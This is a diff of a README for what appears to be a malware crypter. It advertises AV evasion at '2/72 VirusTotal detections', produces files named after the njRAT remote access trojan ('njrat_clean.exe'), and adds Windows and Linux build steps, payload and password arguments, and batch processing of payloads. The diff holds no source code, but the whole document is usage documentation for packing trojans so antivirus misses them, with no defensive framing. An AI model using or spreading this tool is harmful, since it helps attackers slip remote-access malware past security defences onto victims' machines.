@@ -6,7 +6,7 @@
 
 Multi-layer crypter with assembly-optimized encryption and advanced AV evasion techniques. Achieves 2/72 VirusTotal detections (97.2% evasion rate).
 
-**English | [Portuguese](README-pt-BR.md)**
+**English | [Portuguese](README-pt-br.md)**
 
 </div>
 
@@ -110,15 +110,65 @@ cd xor-encrypt
 
 ### Quick Build
 
-```bash
-# Standard build (2/72 detections)
+**Windows:**
+```batch
+REM Standard build (2/72 detections)
 build.bat
 
-# Advanced build with all features (0-1/72 expected)
+REM Advanced build with all features (0-1/72 expected)
 build_advanced.bat
+
+REM Interactive menu system
+build_interactive.bat
 ```
 
-Output: `build\njrat_clean.exe` (standard) or `build\njrat_advanced.exe` (advanced)
+**Linux/macOS:**
+```bash
+# Make scripts executable (first time only)
+chmod +x build.sh build_interactive.sh
+
+# Standard build (2/72 detections)
+./build.sh
+
+# Interactive menu system
+./build_interactive.sh
+```
+
+Output: `build/njrat_clean.exe` (standard) or `build/njrat_advanced.exe` (advanced)
+
+### Cross-Platform Build Scripts
+
+Both Windows (.bat) and Linux/macOS (.sh) scripts are provided with identical functionality:
+
+**Command-Line Arguments:**
+```bash
+# Windows
+build.bat [PAYLOAD] [OUTPUT] [PASSWORD] [LEVEL]
+build.bat payloads\custom.exe output.exe MyPass123 8
+
+# Linux/macOS
+./build.sh [PAYLOAD] [OUTPUT] [PASSWORD] [LEVEL]
+./build.sh payloads/custom.exe output.exe MyPass123 8
+```
+
+**Interactive Menu Features:**
+- Quick Build (use saved config)
+- Custom Build (specify parameters)
+- Batch Build (process multiple payloads)
+- Configuration Management (save/load settings)
+- Detection Testing (scan with defensive tools)
+- Animated progress bars and colored output
+
+**Help Documentation:**
+```bash
+# Windows
+build.bat --help
+build_interactive.bat --help
+
+# Linux/macOS
+./build.sh --help
+./build_interactive.sh --help
+```
 
 ### Manual Workflow
 
